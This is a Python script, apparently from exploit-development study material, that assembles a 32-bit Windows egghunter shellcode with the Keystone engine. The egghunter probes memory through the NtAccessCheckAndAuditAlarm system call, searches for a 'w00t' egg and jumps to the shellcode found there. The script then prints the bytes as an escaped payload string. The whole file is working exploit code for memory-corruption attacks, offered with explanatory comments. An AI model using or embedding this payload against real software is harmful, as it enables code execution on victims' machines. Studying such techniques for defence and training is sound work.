```
from keystone import *

CODE = (
		# We use the edx register as a memory page counter
"							 " 
"	loop_inc_page:			 "
		# Go to the last address in the memory page
"		or dx, 0x0fff		;" 
"	loop_inc_one:			 "
		# Increase the memory counter by one
"		inc edx				;"
"	loop_check:				 "
		# Save the edx register which holds our memory 
		# address on the stack
"		push edx			;"
		# Push the system call number
"		push 0x2 			;" 
		# Initialize the call to NtAccessCheckAndAuditAlarm
"		pop eax				;" 
		# Perform the system call
"		int 0x2e			;" 
		# Check for access violation, 0xc0000005 
		# (ACCESS_VIOLATION)
"		cmp al,05			;" 
		# Restore the edx register to check later 
		# for our egg
"		pop edx				;" 
"	loop_check_valid:		 "
		# If access violation encountered, go to n
		# ext page
"		je loop_inc_page	;" 
"	is_egg:					 "
		# Load egg (w00t in this example) into 
		# the eax register
"		mov eax, 0x74303077	;" 
		# Initializes pointer with current checked 
		# address 
"		mov edi, edx		;" 
		# Compare eax with doubleword at edi and 
		# set status flags
"		scasd				;" 
		# No match, we will increase our memory 
		# counter by one
"		jnz loop_inc_one	;" 
		# First part of the egg detected, check for 
		# the second part
"		scasd				;" 
		# No match, we found just a location 
		# with half an egg
"		jnz loop_inc_one	;" 
"	matched:				 "
		# The edi register points to the first 
		# byte of our buffer, we can jump to it
"		jmp edi				;" 
)

# Initialize engine in 32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
egghunter = ""
for dec in encoding: 
  egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n")
  
print("egghunter = (\"" + egghunter + "\")")
```